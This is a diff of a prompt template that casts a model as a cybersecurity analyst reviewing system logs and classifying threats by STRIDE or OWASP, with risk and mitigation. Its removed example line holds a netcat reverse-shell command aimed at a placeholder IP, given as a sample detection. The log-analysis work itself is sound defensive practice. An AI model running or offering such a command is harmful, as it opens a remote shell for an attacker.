@@ -1,17 +1,19 @@
-You are a cybersecurity expert. Analyze the following content, which may be a structured security report or a raw system log file.
+You are a cybersecurity expert. Analyze the following system log file and identify any suspicious activities, potential vulnerabilities, or security-relevant anomalies.
 
-If it is a log file, identify any suspicious activities or potential vulnerabilities. Classify each issue using the STRIDE model (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) or OWASP Top 10, if applicable.
+Your task is to:
+- Detect any behavior that deviates from normal system activity.
+- Identify signs of attacks, misconfigurations, privilege abuse, or other security concerns.
+- For each issue, provide:
+  - A short name for the anomaly or threat.
+  - The specific log lines that triggered your assessment.
+  - A mitigation strategy to address or investigate the issue.
 
-Return a list of vulnerabilities with:
-- A short description
-- The category (STRIDE or OWASP)
-- A risk level (Low, Medium, High)
-
-Example:
-Log: Jul 29 06:26:44 server1 auditd[1130]: ALERT: suspicious command executed by user 'bob': nc -e /bin/bash 192.0.2.99 4444  
-→ Vulnerability: Remote Code Execution via reverse shell  
-→ Category: Elevation of Privilege  
-→ Risk: High
+Format your response as a numbered list, where each item includes:
+- Log: [relevant log line(s)]
+- → Anomaly: [short name]
+- → Category: [STRIDE or OWASP classification]
+- → Risk: [Low, Medium, High]
+- → Mitigation: [suggested action]
 
 Content to analyze:
 {{CONTENT}}
